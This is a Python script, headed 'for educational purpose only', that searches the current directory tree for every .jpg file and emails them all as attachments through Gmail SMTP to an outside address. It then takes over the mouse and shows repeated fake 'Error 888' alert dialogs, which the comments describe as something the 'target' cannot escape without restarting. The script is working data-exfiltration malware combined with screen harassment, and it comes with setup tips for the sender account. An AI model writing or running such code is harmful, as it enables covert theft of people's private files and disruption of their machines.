# Python script that will send all the jpg files 
# to your Email account
## FOR EDUCATIONAL PURPOSE ONLY
                    ##Author = PersistentGuy  
# libraries to be imported
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import fnmatch
import pyautogui

path = os.getcwd()
##This'll walk your directories recursively
##and return all absolute pathnames that matches .jpg
## you can change *.jpg to any format you want :)
configfiles = [os.path.join(dirpath, f)
    for dirpath, dirnames, files in os.walk(path)
    for f in fnmatch.filter(files, '*.jpg')]

i = configfiles

## SENDER ADDRESS should be gmail
## and go to your Google account + settings + security
## and allow less secure apps 
from_addr = "youraddress@gmail.com"
## Receiver address
## you can use one email add but i recommand using 2
to_address = "toaddress@outlook.com"

#msg object
msg = MIMEMultipart()

## storing the subject
msg['Subject'] = 'Hi your files have arrived!'

## sender address
msg['from'] = from_addr

## storing the receivers email
msg['to'] = to_address

## storing the body of the mail
body = 'Body_of_the_mail'

## attach the body with msg
msg.attach(MIMEText(body, 'plain'))


## looping through configfiles
for i in configfiles:
    with open(i, 'rb') as fp:
        ##instance of MIMEBase and named as part
        part = MIMEBase('application', 'octet-stream')
        # To change the payload into encoded form
        part.set_payload((fp).read())
        # encode into base64
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % os.path.basename(i))
        msg.attach(part)


# creates SMTP session
s = smtplib.SMTP('smtp.gmail.com', 587)

# start TLS for security
s.starttls()
  
# Authentication
# put your password here
s.login(from_addr, "***password***")

# Converts the Multipart msg into a string
text = msg.as_string()
  
# sending the mail
s.sendmail(from_addr, to_address, text)

print("sent succesfully")
## Now let's make something fun after our code have been executed nicely
## putting pyautogui inside a loop so it will
## showing the user an error message
## and you won't get rid of it unless you restart your system
## i set it to 7 just for testing purposes you can set it to
## 100 
for i in range(7):
    ## controlling the target mouse
    ## pyautogui.doubleClick(x position = 11, y position = 353)
    pyautogui.doubleClick(11, 353)
    for k in range(i):
        ##the error message :)
        pyautogui.alert('''Error 888 : This design guide was created for Windows 7 and has not been updated\n
                        for newer versions of Windows. Much of the guidance still applies in principle,\n
                        but the presentation and examples do not reflect our current design guidance.''')


# terminating the session
s.quit()
       
